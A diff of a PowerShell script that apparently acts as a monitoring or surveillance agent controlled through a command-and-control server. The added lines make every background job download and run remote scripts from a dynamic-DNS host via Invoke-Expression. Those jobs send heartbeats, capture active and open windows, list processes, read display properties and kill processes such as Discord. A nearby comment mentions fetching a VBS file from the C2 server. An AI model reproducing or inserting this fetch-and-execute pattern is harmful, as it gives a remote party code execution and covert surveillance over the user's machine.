@@ -252,9 +252,8 @@ $functions = {
 
 # Start the process killing job
 $killProcessJob = Start-Job -ScriptBlock {
-    param ($functionsScriptPath, $configScriptPath)
-    . $functionsScriptPath
-    . $configScriptPath
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/config.ps1")
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/functions.ps1")
 
     function Kill_Processes {
         $defaultProcessesToKill = @('calculatorapp', 'discord')
@@ -293,37 +292,32 @@ $killProcessJob = Start-Job -ScriptBlock {
             break
         }
     }
-} -ArgumentList $functionsScriptPath, $configScriptPath
+}
 
 $heartbeat = Start-Job -InitializationScript $functions -ScriptBlock{
-    param ($functionsScriptPath, $configScriptPath)
-    . $functionsScriptPath
-    . $configScriptPath
-    Send_HeartBeat} -ArgumentList $functionsScriptPath, $configScriptPath
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/config.ps1")
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/functions.ps1")
+    Send_HeartBeat}
 Start-Sleep 2
 $job1 = Start-Job -InitializationScript $functions -ScriptBlock{
-    param ($functionsScriptPath, $configScriptPath)
-    . $functionsScriptPath
-    . $configScriptPath
-    Get_Active_Win} -ArgumentList $functionsScriptPath, $configScriptPath
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/config.ps1")
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/functions.ps1")
+    Get_Active_Win}
 Start-Sleep 2
 $job2 = Start-Job -InitializationScript $functions -ScriptBlock{
-    param ($functionsScriptPath, $configScriptPath)
-    . $functionsScriptPath
-    . $configScriptPath
-    Get_Display_Prop} -ArgumentList $functionsScriptPath, $configScriptPath
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/config.ps1")
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/functions.ps1")
+    Get_Display_Prop}
 Start-Sleep 2
 $job3 = Start-Job -InitializationScript $functions -ScriptBlock{
-    param ($functionsScriptPath, $configScriptPath)
-    . $functionsScriptPath
-    . $configScriptPath
-    Get_Proc_List} -ArgumentList $functionsScriptPath, $configScriptPath
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/config.ps1")
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/functions.ps1")
+    Get_Proc_List}
 Start-Sleep 2
 $job4 = Start-Job -InitializationScript $functions -ScriptBlock{
-    param ($functionsScriptPath, $configScriptPath)
-    . $functionsScriptPath
-    . $configScriptPath
-    Get_Open_Win} -ArgumentList $functionsScriptPath, $configScriptPath
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/config.ps1")
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/functions.ps1")
+    Get_Open_Win}
 Start-Sleep 2
 
 # Function: Download the VBS file content from the C2 server
